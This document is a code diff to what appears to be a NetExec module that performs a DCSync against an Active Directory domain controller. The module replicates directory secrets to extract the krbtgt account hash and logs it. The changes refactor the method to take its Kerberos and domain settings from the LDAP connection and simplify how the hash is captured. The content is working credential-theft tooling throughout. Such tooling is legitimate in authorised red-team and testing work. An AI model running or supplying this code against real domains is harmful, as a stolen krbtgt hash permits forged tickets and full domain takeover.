@@ -26,6 +26,7 @@ class NXCModule:
         self.target_dc = None
         self.valid_tgt = None
         self.new_ticket = None
+        self.krbtgt_hash = ""
 
     def options(self, context, module_options):
         """
@@ -133,33 +134,23 @@ class NXCModule:
             smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
         return smb
 
-    def _dcsync_krbtgt(self, smb_conn, connection):
-        rop, ntds = None, None
+    def _dcsync_krbtgt(self, smb_conn, ldap_conn):
         try:
-            # If SMB was Kerberos (kcache/AES/-k), use Kerberos for RPC too
-            use_kerb = bool(
-                getattr(connection, "kerberos", False)
-                or getattr(connection, "use_kcache", False)
-                or getattr(connection, "aesKey", None)
-            )
-
             rop = RemoteOperations(
                 smb_conn,
-                doKerberos=use_kerb,
-                kdcHost=getattr(connection, "kdcHost", None),
+                doKerberos=ldap_conn.kerberos,
+                kdcHost=ldap_conn.kdcHost,
             )
             rop.enableRegistry()
             rop.getDrsr()
             boot_key = rop.getBootKey()
 
-            domain_netbios = connection.domain.split(".")[0]
+            domain_netbios = ldap_conn.domain.split(".")[0]
             target_user = f"{domain_netbios}/krbtgt"
-            captured = {}
 
             def grab_hash(secret_type, secret):
                 if secret.lower().startswith("krbtgt:"):
                     self.krbtgt_hash = secret
-                    captured["hash"] = secret
 
             ntds = NTDSHashes(
                 None,
@@ -174,19 +165,14 @@ class NXCModule:
             )
             ntds.dump()
 
-            if "hash" in captured:
-                self.context.log.highlight(
-                    f"krbtgt hash from {connection.domain} : {captured['hash']}"
-                )
+            if self.krbtgt_hash:
+                self.context.log.highlight(f"krbtgt hash from {ldap_conn.domain}: {self.krbtgt_hash}")
             else:
                 self.context.log.fail("DCSync completed - krbtgt hash not found!")
-
         except DCERPCSessionError as e:
-            self.context.log.fail(f"RPC DRSUAPI error : {e}")
-
+            self.context.log.fail(f"RPC DRSUAPI error: {e}")
         except Exception as e:
-            self.context.log.fail(f"DCSync error : {e}")
-
+            self.context.log.fail(f"DCSync error: {e}")
         finally:
             with suppress(Exception):
                 if ntds:
